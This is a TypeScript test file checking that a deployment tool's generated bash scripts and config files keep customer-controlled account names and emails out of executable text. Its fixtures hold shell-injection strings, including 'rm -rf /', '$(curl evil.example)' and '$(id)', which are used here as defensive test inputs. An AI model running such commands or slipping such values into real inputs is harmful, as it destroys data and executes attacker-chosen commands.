import { execFileSync } from "node:child_process";
import { expect, test } from "vitest";
import { configFileOf, mintConfig } from "./config.ts";
import type { DeploymentRecord } from "./records.ts";
import { runScriptOf } from "./runs.ts";

// Free text a customer controls: Cloudflare's account name, and the address they sign in with.
const hostileName = "Acme\nrm -rf / # $(curl evil.example) `id` '\"";
const hostileEmail = "a+$(id)`x`@example.com";
const record: DeploymentRecord = {
  id: "dep_aaaabbbbccccdddd",
  name: "my-iterate",
  accountId: "11111111111111111111111111111111",
  accountName: hostileName,
  connection: "aaaabbbbcccc",
  store: "alchemy-state-store",
  stack: "iterate-my-iterate",
  owner: { sub: "user_aaaabbbbccccddddaaaabbbbccccdddd", email: hostileEmail },
  createdAt: "2026-11-06T12:00:00.000Z",
};
const image = {
  account: "11111111222222223333333344444444",
  secret: "/secrets/cloud-image-source",
  digest: "sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
};
const step = { destinationUser: "v1", sourceUser: "v1" };

test("a run's script holds no free text: not the account's name, not the owner's address", () => {
  for (const kind of ["plan", "deploy", "destroy"] as const) {
    const script = runScriptOf(record, kind, 42, image, kind === "destroy" ? undefined : step);
    expect(script).not.toContain("Acme");
    expect(script).not.toContain("$(id)");
    expect(script).not.toContain(hostileEmail);
    expect(script).toContain(
      "export ITERATE_CONFIG_FILE='../../../deployments/dep_aaaabbbbccccdddd/iterate.config.ts'",
    );
    expect(script).toContain(
      `getSecret("/secrets/cloud-cloudflare-aaaabbbbcccc", { field: "accessToken" })`,
    );
  }
});

test("the config file holds the owner's address only as a JSON string, and the secrets core/os reads by path", () => {
  // mintConfig refuses such an address (z.email); the file must hold whatever it is given safely
  const minted = mintConfig({ ...record, owner: { ...record.owner, email: "ada@example.test" } });
  const config = { ...minted, login: { ...minted.login, allow: [{ email: hostileEmail }] } };
  const file = configFileOf(config, "/work/core/core/os");
  expect(file.split(JSON.stringify(hostileEmail)).join("")).not.toContain(hostileEmail);
  expect(file).toContain(JSON.stringify(hostileEmail));
  expect(file).not.toContain("Acme");
  // the fields behind ITERATE__SECRETS_ENCRYPTION__KEY, ITERATE__ADMIN_BEARER and
  // ITERATE__LOGIN__METHODS__PASSWORD__PASSWORD (core/os/src/iterate-config.ts)
  expect(file).toContain(
    "secretsEncryption: { ...base.secretsEncryption, key: cloud.secretsEncryption.key }",
  );
  expect(file).toContain("adminBearer: cloud.adminBearer");
  expect(JSON.parse(/const cloud = (\{[\s\S]*?\n\});/.exec(file)![1]!)).toEqual(config);
});

test("a hostile address is refused at minting, and each config gets its own secrets", () => {
  expect(() => mintConfig(record)).toThrow();
  const plain = { ...record, owner: { ...record.owner, email: "ada@example.test" } };
  const [one, two] = [mintConfig(plain), mintConfig(plain)];
  expect(one.secretsEncryption.key).toMatch(/^[0-9a-f]{64}$/);
  expect(one).not.toMatchObject({ secretsEncryption: two.secretsEncryption });
  expect(one).not.toMatchObject({ login: { methods: two.login.methods } });
  expect(one).toMatchObject({
    cloudflare: { accountId: record.accountId, resourcePrefix: "my-iterate", workersDev: true },
  });
});

test("a deploy, and only a deploy, ends by asking the new Worker's address until it answers", () => {
  const deploy = runScriptOf(record, "deploy", 42, image, step);
  expect(deploy.indexOf("== step check")).toBeGreaterThan(deploy.indexOf("== step alchemy"));
  expect(deploy).toContain('address="https://my-iterate.$sub.workers.dev"');
  expect(runScriptOf(record, "plan", 42, image, step)).not.toContain("== step check");
  // the image is the toolchain's digest: nothing is read from a repository
  expect(deploy).toContain(`digest=${image.digest}`);
  expect(deploy).not.toMatch(/GitOrigin-RevId|api\.github\.com/);
});

test("with no image source a run copies no image: its step says so, and core's deploy pins none", () => {
  for (const kind of ["plan", "deploy"] as const) {
    const script = runScriptOf(record, kind, 42, null, undefined);
    execFileSync("bash", ["-n"], { input: script });
    expect(script).toContain(
      `echo "== step image"\necho "skipped: sandboxes start Cloudflare's managed image"\n`,
    );
    expect(script).not.toMatch(/crane|registry\.cloudflare\.com|image-preparations/);
    expect(script).toContain("export ITERATE_IMAGE_PINS='{}'");
    // where the copy would stand: after the namespace, before the build
    expect(script.indexOf("== step image")).toBeGreaterThan(script.indexOf("== step namespace"));
    expect(script.indexOf("== step build")).toBeGreaterThan(script.indexOf("== step image"));
  }
});

test("each script is valid bash, and a destroy, and only a destroy, ends by deleting the namespace the install made", () => {
  for (const kind of ["plan", "deploy", "destroy"] as const)
    execFileSync("bash", ["-n"], {
      input: runScriptOf(record, kind, 42, image, kind === "destroy" ? undefined : step),
    });
  const destroy = runScriptOf(record, "destroy", 42, null, undefined);
  expect(destroy.indexOf("== step repos")).toBeGreaterThan(destroy.indexOf("== step alchemy"));
  expect(destroy).toContain("/artifacts/namespaces/my-iterate-repos");
  expect(runScriptOf(record, "deploy", 42, image, step)).not.toContain("== step repos");
});
